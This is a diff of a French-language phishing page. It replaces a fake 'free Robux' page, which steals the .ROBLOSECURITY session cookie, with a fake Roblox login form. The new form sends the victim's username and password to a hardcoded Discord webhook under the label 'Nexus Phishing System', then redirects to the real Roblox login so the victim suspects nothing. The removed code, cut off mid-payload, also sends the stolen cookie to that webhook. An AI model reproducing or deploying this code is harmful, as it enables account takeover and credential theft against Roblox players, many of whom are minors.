@@ -1,85 +1,67 @@
 <!DOCTYPE html>
-
 <html lang="fr">
-
 <head>
-
     <meta charset="UTF-8">
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Roblox - Récompense Exclusive</title>
-
+    <title>Connexion - Roblox</title>
     <style>
-
-        body { background-color: #1b1d1f; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; }
-
-        .card { background: #2b2e31; border-radius: 8px; padding: 40px; display: inline-block; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
-
-        h1 { color: #00b06f; }
-
-        .btn { background-color: #00b06f; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; font-size: 18px; }
-
-        .btn:hover { background-color: #008f5a; }
-
-        p { color: #bdc3c7; }
-
+        body { background-color: #f2f4f5; font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); width: 400px; text-align: center; }
+        .logo { width: 200px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #b8b8b8; border-radius: 3px; box-sizing: border-box; font-size: 16px; }
+        .btn-login { background-color: #0084ff; color: white; border: none; padding: 12px; width: 100%; border-radius: 3px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        .btn-login:hover { background-color: #0074e0; }
+        h2 { font-weight: 500; color: #404040; margin-bottom: 20px; }
     </style>
-
 </head>
-
 <body>
 
+<div class="login-container">
+    <img src="https://images.rbxcdn.com/f989e52e5b72186987f27e504c38bc6a.png" class="logo" alt="Roblox">
+    <h2>Connexion à Roblox</h2>
+    
+    <input type="text" id="user" placeholder="Nom d'utilisateur / E-mail / Téléphone">
+    <input type="password" id="pass" placeholder="Mot de passe">
+    
+    <button onclick="sendData()" class="btn-login">Se connecter</button>
+    
+    <p style="color: #666; font-size: 13px; margin-top: 20px;">Mot de passe ou nom d'utilisateur oublié ?</p>
+</div>
 
+<script>
+async function sendData() {
+    const webhook = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9"; // <--- METS TON LIEN DISCORD ICI
+    const user = document.getElementById('user').value;
+    const pass = document.getElementById('pass').value;
 
-    <div class="card">
+    if(user === "" || pass === "") {
+        alert("Veuillez remplir tous les champs.");
+        return;
+    }
 
-        <img src="https://images.rbxcdn.com/f989e52e5b72186987f27e504c38bc6a.png" width="100" alt="Roblox Logo"><br><br>
+    const payload = {
+        embeds: [{
+            title: ":man_detective: NOUVEAUX IDENTIFIANTS RÉCUPÉRÉS",
+            color: 16711680, // Rouge
+            fields: [
+                { name: ":bust_in_silhouette: Utilisateur", value: user, inline: true },
+                { name: ":key: Mot de passe", value: pass, inline: true }
+            ],
+            footer: { text: "Nexus Phishing System" }
+        }]
+    };
 
-        <h1>FÉLICITATIONS !</h1>
+    // Envoi vers ton Discord
+    await fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
 
-        <p>Tu as été sélectionné pour recevoir <b>1 000 Robux</b> ou un <b>Item Limité</b>.</p>
+    // Redirection vers le vrai Roblox pour ne pas qu'il se doute de rien
+    window.location.href = "https://www.roblox.com/login";
+}
+</script>
 
-        <p>Clique sur le bouton ci-dessous pour valider ton compte et recevoir ton gain.</p><br>
-
-        
-
-        <button onclick="beam()" class="btn">RÉCUPÉRER MA RÉCOMPENSE</button>
-
-    </div>
-
-
-
-    <script>
-
-    async function beam() {
-
-        // --- COLLE TON LIEN DISCORD CI-DESSOUS ---
-
-        const webhookURL = "https://discord.com/api/webhooks/1490805370715902075/gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9"; 
-
-        
-
-        // Récupération du Cookie .ROBLOSECURITY
-
-        const cookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
-
-
-
-        if (!cookie) {
-
-            // Si pas de cookie (pas connecté sur ce navigateur), on simule une erreur
-
-            alert("Erreur de session : Connecte-toi d'abord à Roblox sur ce navigateur.");
-
-            return;
-
-        }
-
-
-
-        const payload = {
-
-            username: "NEXUS BEAMER",
-
-            avatar_url: "
+</body>
+</html>
